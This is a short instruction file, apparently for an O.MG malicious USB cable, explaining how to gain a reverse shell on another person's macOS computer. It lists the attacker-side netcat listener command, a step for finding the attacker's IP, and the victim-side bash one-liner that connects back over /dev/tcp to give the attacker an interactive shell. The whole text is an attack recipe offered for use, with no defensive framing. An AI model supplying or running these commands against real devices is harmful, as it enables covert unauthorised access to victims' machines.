# This is, at heart, is a simple reverse shell to gain access to another MacOSX device. I'm looking into creating a tight shell that can run like a daemon but that is a wet dream atm.

# FIRST STEP(s):
# run this on the attackers machine
    nc -l 'any port'
# This initializes your computers listening protocol to look for TCP connections
# IMPORTANT
# open another Terminal window and run to obtain your computers local ip (this is important for the next step)
    ipconfig getifaddr en0

# NEXT STEP:
# Then simply run the script in your O.MG UI when the cable is connected

# An example of the code run on the attackers computer:
    nc -l 80

# An example of the code run on the victims computer:
    bash -i >& /dev/tcp/10.0.0.1/80 0>&1
